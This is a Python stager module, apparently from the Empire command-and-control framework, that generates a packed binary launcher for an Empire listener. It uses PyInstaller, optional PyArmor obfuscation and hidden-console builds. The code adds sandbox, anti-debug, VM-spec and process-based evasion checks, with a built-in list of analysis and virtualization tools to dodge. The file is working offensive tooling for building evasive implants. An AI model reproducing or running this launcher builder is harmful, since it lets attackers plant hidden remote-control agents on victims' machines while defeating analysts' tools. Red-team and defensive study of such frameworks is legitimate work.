from __future__ import print_function

import datetime
import logging
import os
import re
import secrets
from builtins import object

log = logging.getLogger(__name__)


class Stager(object):
    def __init__(self, mainMenu, params=None):
        if params is None:
            params = []
        self.info = {
            "Name": "pyInstaller + pyArmor Launcher",
            "Authors": [
                {
                    "Name": "0xf0b05",
                    "Handle": "@none",
                    "Link": "https://nolink",
                }
            ],
            "Description": "Generates an binary payload launcher for Empire using pyInstaller.",
            "Comments": ["“Now, I am become Death, the destroyer of worlds.”"],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "BuildArch": {
                "Description": "Destination OS for launcher.",
                "Required": True,
                "Value": "Windows",
                "SuggestedValues": ["Windows", "Unix"],
            },
            "BinaryFile": {
                "Description": "File to output launcher to.",
                "Required": True,
                "Value": "/tmp/empire",
            },
            "SafeChecks": {
                "Description": "Switch. Checks for SandBox, exit the staging process if true. "
                               "Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Obfuscation": {
                "Description": "Obfuscate launcher with random data.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
            },
            "CheckDebug": {
                "Description": "Anti-debug checks",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
            },
            "CheckSpecs": {
                "Description": "Check machine specs and try avoid VMS or sandboxes",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
            },
            "CheckProcess": {
                "Description": "Check process and avoid launcher execution. Checks for procs within the task list "
                               "with 'contains' function. ('none' or comma divided)",
                "Required": True,
                "Value": "df5serv,fiddler,frida,gdb,httpdebugger,ida,joebox,ksdumper,ollydbg,pestudio,prl_cc,"
                         "prl_tools,processhacker,qemu-ga,radare,regedit,taskmgr,vboxservice,vboxtray,vgauthservice,"
                         "vmacthlp,vmsrvc,vmtoolsd,vmusrvc,vmware,wireshark,x32dbg,x96dbg,xenservice,snitch",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "Empire",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]["Value"] = value

    def generate(self):
        import subprocess

        language = 'python'
        build_arch = self.options["BuildArch"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]

        binary_file_str = self.options["BinaryFile"]["Value"]
        binary_file_str = f'{binary_file_str}_{datetime.datetime.now().strftime("%d_%m_%Y_%H%M%S")}'

        safe_checks = self.options["SafeChecks"]["Value"]
        obfuscation = self.options["Obfuscation"]["Value"] == 'True'
        check_debug = self.options["CheckDebug"]["Value"] == 'True'
        check_specs = self.options["CheckSpecs"]["Value"] == 'True'
        obfuscation_command = []

        if check_debug:
            obfuscation_command.append('debug:')
        if check_specs:
            obfuscation_command.append('specs:')
        if check_process := self.options["CheckProcess"]["Value"]:
            obfuscation_command.append(f'procs:{check_process}')

        output_str = subprocess.check_output(["which", "pyinstaller"])
        if output_str == "":
            log.error("pyInstaller is not installed")
            log.error("Try: apt install python-pip && pip install pyinstaller")
            return ""
        output_str = subprocess.check_output(["which", "pyarmor"])
        if output_str == "":
            log.error("pyInstaller is not installed")
            log.error("Try: apt install python-pip && pip install pyarmor")
            return ""
        active_listener = self.mainMenu.listenersv2.get_active_listener_by_name(
            listener_name
        )
        a_code = active_listener.generate_agent(
            active_listener.options, language=language
        )
        c_code = active_listener.generate_comms(
            active_listener.options, language=language
        )
        s_code = active_listener.generate_stager(
            active_listener.options,
            language=language,
            encrypt=False,
            encode=False,
        )
        import_pattern = r'import\s+\S+|from\s+\S+\s+import\s+\S+'
        import_list = re.findall(import_pattern, a_code + c_code + s_code)
        import_list = {import_statement.strip() for import_statement in import_list}
        from_list = [x for x in import_list if x.startswith('from')]
        import_list = [x.split(' ')[1] for x in import_list if x.startswith('import')]

        launcher = self.mainMenu.stagers.generate_launcher(
            listenerName=listener_name,
            language=language,
            encode=False,
            userAgent=user_agent,
            safeChecks=safe_checks,
            obfuscate=obfuscation,
            obfuscation_command='|'.join(obfuscation_command),
            build_arch=build_arch,
            extra={'from_list': from_list, 'import_list': import_list}
        )

        if launcher == "":
            log.error("Error in launcher command generation.")
            return ""

        with open(f'{binary_file_str}.py', 'w') as text_file:
            text_file.write(f"{launcher}")

        log.info(f"Created {binary_file_str}.py")

        if 'win' in build_arch.lower():
            log.info(f"Packing {binary_file_str}.py to exe file")
            pyinstaller = 'wine pyinstaller'
            target_platform = '--platform windows.x86'
        else:
            log.info(f"Packing {binary_file_str}.py to bin file")
            pyinstaller = 'pyinstaller'
            target_platform = '--platform linux.x86_64'

        workpath = f'/tmp/{datetime.datetime.now().strftime("%d_%m_%Y_%H%M%S")}-build/'
        original = f'{workpath}{os.path.basename(binary_file_str)}'

        command = f'mkdir {workpath}'
        subprocess.run(command, shell=True, text=True)
        # MV py to build folder
        command = f'mv {binary_file_str}.py {workpath}'
        log.warning(command)
        subprocess.run(command, shell=True, text=True)

        if obfuscation:
            # Obfuscation
            log.info(f"Obfuscating {original}.py with pyarmor")
            command = f'pyarmor gen {target_platform} -O {workpath}obfdist {original}.py'
            log.warning(command)
            subprocess.run(command, shell=True, text=True)

            # MV runtime
            command = f'mv {workpath}obfdist/pyarmor_runtime_000000 {workpath}'
            log.warning(command)
            subprocess.run(command, shell=True, text=True)

            # Create spec
            log.info(f"Creating {original}.py spec file")
            command = (f'pyi-makespec -F --noupx --noconsole --key {secrets.token_hex(8)} '
                       f'--hidden-import pyarmor_runtime_000000 {os.path.basename(binary_file_str)}.py')
            log.warning(command)
            subprocess.run(command, shell=True, text=True, cwd=workpath)

            # Patch spec
            log.info(f"Patching {original}.spec file")
            patch_spec(workpath, f'{workpath}obfdist/', f'{original}.spec')

            # Create PyInstaller binary
            log.info(f"Packing obfuscated {original}.spec with pyinstaller")
            command = f'{pyinstaller} -y --clean --distpath {workpath} {original}.spec'
        else:
            log.info(f"Packing {binary_file_str}.py with pyinstaller")
            command = (f'{pyinstaller} -y -F --clean --noupx --noconsole '
                       f'--key {secrets.token_hex(8)} '
                       f'--specpath {workpath} '
                       f'--distpath {workpath} '
                       f'--workpath {workpath} '
                       f'{original}.py')
        log.warning(command)
        subprocess.run(command, shell=True, text=True)
        if os.path.exists(workpath):
            subprocess.run(f'rm -rf {workpath}', shell=True, text=True)
        output = f'{original}.exe' if 'win' in build_arch.lower() else original
        if os.path.exists(output):
            with open(output, "rb") as f:
                return f.read()
        log.error("Error in launcher generation.")
        return ""


def patch_spec(path_src, obf_src, spec_file):
    with open(spec_file, 'r') as file:
        lines = file.readlines()
    target = "pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)"
    patch = f"""
def pyarmor_patcher(src, obfdist):
    # Make sure both of them are absolute paths
    src = os.path.abspath(src)
    obfdist = os.path.abspath(obfdist)

    count = 0
    for i in range(len(a.scripts)):
        if a.scripts[i][1].startswith(src):
            x = a.scripts[i][1].replace(src, obfdist)
            if os.path.exists(x):
                a.scripts[i] = a.scripts[i][0], x, a.scripts[i][2]
                count += 1
    if count == 0:
        raise RuntimeError('No obfuscated script found')

    for i in range(len(a.pure)):
        if a.pure[i][1].startswith(src):
            x = a.pure[i][1].replace(src, obfdist)
            if os.path.exists(x):
                if hasattr(a.pure, '_code_cache'):
                    with open(x) as f:
                        a.pure._code_cache[a.pure[i][0]] = compile(f.read(), a.pure[i][1], 'exec')
                a.pure[i] = a.pure[i][0], x, a.pure[i][2]

pyarmor_patcher(r'{path_src}', r'{obf_src}')
"""

    for i, line in enumerate(lines):
        if line.strip() == target:
            lines[i:i] = patch.splitlines(True)
            break

    with open(spec_file, 'w') as file:
        file.writelines(lines)
